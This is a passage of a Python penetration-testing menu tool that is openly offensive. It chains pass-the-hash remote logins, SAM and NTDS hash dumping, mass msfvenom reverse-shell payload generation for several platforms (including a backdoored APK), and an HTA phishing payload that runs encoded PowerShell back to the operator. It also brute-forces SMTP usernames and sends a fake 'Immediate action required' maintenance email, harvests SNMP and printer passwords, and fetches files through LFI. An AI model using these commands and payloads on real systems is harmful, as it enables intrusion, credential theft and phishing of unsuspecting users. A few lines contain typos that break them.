               print("\n[+] Checking priviliges...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
               print("\n[+] Enumerating users...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
               print("\n[+] Enumerating shares...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
               print("\n[+] Enumerating sessions...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
               print("\n[+] Enumerating SAM...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
               print("\n[+] Enumerating NTDS...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
      prompt()	# EOF Error here for some reason?
               
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         runCommand(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n", colour3))
         runCommand(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()         
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         runCommand(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nikto scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      print(colored("[*] Service scanning host, please wait this can take sometime...", colour3))
      checkParams = test_WEB()
      if checkParams != 1:
         if WEB[:5].upper() == "HTTPS":
            runCommand("nikto -ssl   -h " + WEB.rstrip(" "))
         else:
            runCommand("nikto -nossl -h " + WEB.rstrip(" "))
      else:
         if IP46 == "-4":
            checkParams = test_TIP()
         else:
            checkParams = test_DOM()
         if checkParams != 1:   
            if ":" in TIP:
               runCommand("nikto -h " + DOM.rstrip(" "))	# IP 6 ISSUES
            else:
               runCommand("nikto -h " + TIP.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap vuln #nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      checkParams = test_TIP()
      if checkParams != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            runCommand("nmap -sV -p " + PTS.rstrip(" ") + " --reason --script *vuln* --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")           
            catsFile("light.tmp")
         else:
            print("[-] No ports to scan...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap exploit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      checkParams = test_TIP()
      if checkParams != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            runCommand("nmap -sV -p " + PTS.rstrip(" ")  + " --reason --script exploit --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            catsFile("light.tmp")
         else:
            print("[-] No ports to scan...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Searchsploit service
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '64':
      services = input("[?] Please enter service name: ")
      runCommand("searchsploit '" + services + "' > sploit.tmp")      
      nullTest = linecache.getline("sploit.tmp",1)      
      if "Exploits: No Results" in nullTest:
         print("[-] No exploits were found for service " + services + "...")
         nullTest = linecache.getline("sploit.tmp",2)
         if "Shellcodes: No Results" in nullTest:
            print("[-] No shellcodes were found for service " + services + "...")         
      else:
         print("[+] Exploits found...")
         catsFile("sploit.tmp") 
         services = input("[?] Please enter service name to download: ")
         runCommand("searchsploit -m '" + services + "'")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Exploit creater
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':                 
      checkParams = getPort()      
      if checkParams != 1:
         if OSF[:7] == "WINDOWS":
            print(colored("[*] Creating microsoft windows exploits...", colour3))
            if not os.path.exists(explDir + "/staged"):
               runCommand("mkdir " + explDir + "/staged")
            if not os.path.exists(explDir + "/stageless"):
               runCommand("mkdir " + explDir + "/stageless")
            print("[+] Manufacturing staged exploits...")   
            runCommand("msfvenom -p windows/x64/shell/reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")
            runCommand("msfvenon -p windows/shell/reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")         
            runCommand("msfvenom -p windows/x64/meterpreter/reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter/reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            if TIP[:5] != "EMPTY":
               runCommand("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
               runCommand("msfvenom -p windows/meterpreter/bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows/x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
            print("[+] Manufacturing stageless exploits...")                            
            runCommand("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORP=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter_reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter_reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter_reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter_reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter_reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/meterpreter_reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p windows/x64/meterpreter_reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")           
            runCommand("msfvenom -p windows/meterpreter_reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            if TIP[:5] != "EMPTY":
               runCommand("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
               runCommand("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")

#            runCommand("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
#            runCommand("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
            
         if OSF[:5] == "LINUX":
            print(colored("[*] Creating linux exploits...", colour3))
            runCommand("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
            runCommand("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_tcp.elf >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         

         if OSF[:7] == "ANDROID":
            print(colored("[*] Creating android exploits...", colour3))
#           runCommand("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
            runCommand("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_meterpreter_reverse_tcp.apk >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_http.apk >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_https.apk >> arsenal.tmp 2>&1")         
         if OSF[:4] == "OS X":
            print(colored("[*] Creating mac exploits...", colour3))
            runCommand("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_reverse_tcp.macho >> arsenal.tmp 2>&1")
            runCommand("msfvenom -p osx/x86/shell_bind_tcp                     RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_bind_tcp.macho >> arsenal.tmp 2>&1")
         if OSF[:3] == "IOS":
            print(colored("[*] Creating ios exploits...", colour3))
            print("NOT IMPLEMENTED")            

         print(colored("[*] Creating other exploits that you might require...", colour3))
         runCommand("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/windows_meterpreter_reverse_tcp.asp >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f aspx   -o " + explDir + "/windows_meterpreter_reverse_tcp.aspx >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/java_jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_bash.sh >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_python.py >> arsenal.tmp 2>&1")
         runCommand("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_perl.pl >> arsenal.tmp 2>&1")
         runCommand("chmod +X *.*")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
# Modified: N/A
# Note    : Alternative dictionary - alternative /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/seclists/Discovery/Web-Content/common.txt
# -------------------------------------------------------------------------------------

   if selection =='66':
      print(colored("[*] Scanning for directories and files, please wait this will take a long time...", colour3))   
      checkParams = test_WEB()
      if checkParams != 1:
         print("[+] Using URL address...")
         target = WEB.rstrip(" ")
      else:
         print("[+] Using IP address...")
         target = TIP.rstrip(" ")
#      runCommand("echo '" + Green + "'")
      runCommand("feroxbuster -u " + target + " -x " + fileExt + " -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -o dir.tmp -q -k") # --silent
#      runCommand("echo '" + Reset + "'")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SNMP Walker + 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      checkParams = test_PRT("161")      
      if checkParams != 1:
         print(colored("[*] Checking all communities...", colour3))
         runCommand("echo 'public' > community.tmp")
         runCommand("echo 'private' >> community.tmp")
         runCommand("echo 'manager' >> community.tmp")
         runCommand("onesixtyone -c community.tmp " + TIP.rstrip(" ") + " > 161.tmp") 
         catsFile("161.tmp")
         print(colored("[*] Enumerating public v2c communities Part I...", colour3))   
         print("[+] Checking system processes...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking running processes...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking running systems...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking storage units...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking software names...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking user accounts...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > walk.tmp")
         catsFile("walk.tmp")      
         print("[+] Checking local ports...")
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
         catsFile("walk.tmp")
         print("[+] Checking for printer passwords...")
         runCommand("snmpwalk -v 2c -c public " + TIP.rstrip(" ") + " .1.3.6.1.4.1.11.2.3.9.1.1.13.0 > printer.tmp")
         catsFile("printer.tmp")              
         runCommand("cat printer.tmp | tr -d '\n\r' > printer2.tmp")
         found = linecache.getline("printer2.tmp", 1).rstrip("\n")
         if "BITS" in found:
            data1,data2 = found.split("BITS:")
            printer = binascii.unhexlify(data2.replace(' ',''))
            printer2 = str(printer)
            printer2 = printer2.replace("b'","")
            data3 = printer2.split('\\x13',1)[0]
            printerpassword = data3
            print(colored(printerpassword + "\n", colour0))
         print(colored("[*] Enumerating public v2c communities part II...", colour3))           
         runCommand("snmp-check -v 2c -w " + TIP.rstrip(" ") + " > check.tmp")
         catsFile("check.tmp")         
         print(colored("[*] Enumerating the entire MIB tree, please wait this may take sometime...", colour3))
         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walker.tmp")    
         print("[+] Searching for any interesting finds...")
         runCommand("cat walker.tmp | grep 'password' > find.tmp")
         runCommand("cat walker.tmp | grep 'user'     >> find.tmp")              
         finds = linecache.getline("find.txt", 1)
         if finds[:1] == "":
            print("[-] No usernames or passwords were found...")
         else:
            catsFile("find.tmp")
         print("[+] MIB enumeration contents available as MIB.txt...")
         runCommand("mv walker.tmp MIB.txt")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Manual Phising...
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      checkParams = getPort()
      if HTTP == 0:
         print("[-] You need to start the HTTP server first...")
         checkParams = 1               
      if checkParams != 1:    
         print(colored("[*] Starting phishing server...", colour3))               
         runCommand("xdotool key Ctrl+Shift+T")
         runCommand("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
         dispBanner("GONE PHISHING",0)
         runCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
         runCommand("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
         runCommand("xdotool key Ctrl+Tab")            
         payLoad = f"""      
         a=new ActiveXObject("WScript.Shell");
         a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
         """.encode()            
         bpayLoad = base64.b64encode(payLoad)
         final = encrypt(bpayLoad)                  
         with open('payrise.hta', 'w') as hta:
            hta.write(body(final))         
         print("[+] Exploit created, utilise the following code snippet to activate...")
         print(colored("\nhttp://" + localIP + ":" + HTTP + "/payrise.hta",colour6))          
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Automated phisher.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      if HTTP != 0:
         checkParams = test_TIP()      
         if checkParams != 1:
            checkParams = test_DOM()         
         if checkParams != 1:
            checkParams = test_PRT("25")         
         if checkParams != 1:
            checkParams = getPort()                 
            if checkParams != 1:
               print("\n- - - - - - - - - - - - - - - - - - - - - - -")
               print("Target   : " + TIP.rstrip(" "))
               print("Sender   :", end=' ')
               if USR[:1] == "'":
                  print("it@" + localIP + " (defualt)")
               else:
                  print(USR.rstrip(" "))
               print("Recipient: usernames.txt")
               print("Domain   : " + DOM.strip(" "))
               print("- - - - - - - - - - - - - - - - - - - - - - -\n")
               print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               try:
                  connect = s.connect((TIP.rstrip(" "),25))
                  print("[+] Succesfully connected to " + TIP.rstrip(" ") + ":25...\n")
               except:
                  print("[+] Unable to connect to " + TIP.rstrip(" ") + ":25...\n")
                  prompt()
                  break 
               bannerResponce = s.recv(1024)
               print(colored(bannerResponce, colour6))                     
               print("\n[+] Saying hello...\n")
               if "ESMTP" in str(bannerResponce):
                  string = "EHLO RogueAgent\r\n"
               else:
                  string = "HELO RogueAgent\r\n"
               s.send(bytes(string.encode()))
               helloResponce = s.recv(1024)
               print(colored(helloResponce, colour6))            
               print("\n[+] Specifying my email address...\n")
               string = "MAIL FROM:<rogueagent@kali.domain>\r\n"
               s.send(bytes(string.encode()))
               mailResponce = s.recv(1024)
               print(colored(mailResponce, colour6))               
               print("\n[+] Trying recipient email address root@" + DOM.rstrip(" ") + "...\n")
               string = "RCPT TO:<root@" + DOM.rstrip(" ") + ">\r\n"
               s.send(bytes(string.encode()))
               rcptResponce = s.recv(1024)
               print(colored(rcptResponce, colour6))            
               print("\n[+] Asking for help...\n")            
               string = "HELP\r\n"
               s.send(bytes(string.encode()))
               helpResponce = s.recv(1024)
               print(colored(helpResponce, colour6))            
               print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
               count = lineCount(dataDir + "/usernames.txt")
               runCommand("touch valid.tmp")
               for x in range(0, count):
                  data = linecache.getline(dataDir + "/usernames.txt", x + 1)
                  string = "VRFY " + data.rstrip("\n") + "\r\n"
                  try:
                     s.send(bytes(string.encode()))
                     bruteCheck = s.recv(1024)
                  except:
                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
                  if "550" not in str(bruteCheck):
                     runCommand("echo " + data.rstrip("\n") + " >> valid.tmp")
               nullTest = linecache.getline("valid.tmp",1)
               if nullTest != "":
                  print("[+] Valid usernames found...")
                  catsFile("valid.tmp")
                  check = 0
               else:
                  print("[-] No valid usernames found...")
                  check = 1                  
               print("[+] Saying goodbye...\n")            
               string = "QUIT\r\n"
               try:
                  s.send(bytes(string.encode()))
                  quitResponce = s.recv(1024)
                  print(colored(quitResponce, colour6)) 
               except:
                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))   
               s.close()            
               if check != 1:
                  print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
                  runCommand('echo "Subject: Immediate action required\n" > body.tmp')
                  runCommand('echo "Hello.\n" >> body.tmp')
                  runCommand('echo "We just performed maintenance on our servers." >> body.tmp') 
                  runCommand('echo "Please verify if you can still access the login page:\n" >> body.tmp')
                  runCommand('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
                  runCommand('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
                  runCommand('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
                  runCommand('echo "\nRegards," >> body.tmp')
                  if USR[:1] == "'":
                     runCommand('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
                     sender = "it"
                  else:
                     runCommand('echo ' + USR.rstrip(" ") + '@' + localIP + ' >> body.tmp')
                     sender = USR.rstrip(" ")
                  catsFile("body.tmp")
                  print(colored("[*] Phishing the valid username list...", colour3))
                  parsFile("valid.tmp")
                  with open("valid.tmp", "r") as list:
                     for phish in list:
                        phish = phish.rstrip("\n")
                        phish = phish.strip(" ")
                        phish = phish + "@"
                        phish = phish + DOM.rstrip(" ")
                        try:
                           runCommand("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                           print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
                        except:
                           print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
      else:
         print("[-] You need to start the smtpd server first...")
      prompt()  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - LFI CHECK
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '70':
      checkParams = test_WEB()
      if checkParams != 1:
         print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
         if OSF[:5].upper() != "EMPTY":
            os.chdir("BLACKBRIAR")
            if OSF[:5].upper() == "LINUX":
               file1 = open("../TREADSTONE/linuxlfi.txt", 'r')
               Lines = file1.readlines()
               for line in Lines:
                  file = line.replace("/","-")
                  file = file.replace("\\","-")
                  file = file.replace(" ","_")
                  file = file.rstrip("\n")
                  ffile = "file" + file
                  runCommand("wget -q -O " + ffile + " " + WEB + line)
                  if os.stat(ffile).st_size == 0:
                     runCommand("rm " + ffile)
               print("[+] Completed...")
            else:
               file1 = open("../TREADSTONE/windowslfi.txt", 'r')
               Lines = file1.readlines()
               for line in Lines:
                  file = line.replace("/","-")
                  file = file.replace("\\","-")
                  file = file.replace(" ","_")
                  file = file.rstrip("\n")
                  ffile = "file" + file
                  runCommand("wget -q -O " + ffile + " " + WEB + line)
                  if os.stat(ffile).st_size == 0:
                     runCommand("rm " + ffile)
               print("[+] Completed...")
            runCommand("cd ..")
         else:
            print("[-] Unknown operating system...")          
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nano file editor
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      dispSubMenu(" (01) User Names (02) Pass Words (03) NTLM Hashes (04) Hosts Config (05) Resolv Config (06) Proxychains Config (07) Kerb5 Config (08) Quit")
      checkParams = 0
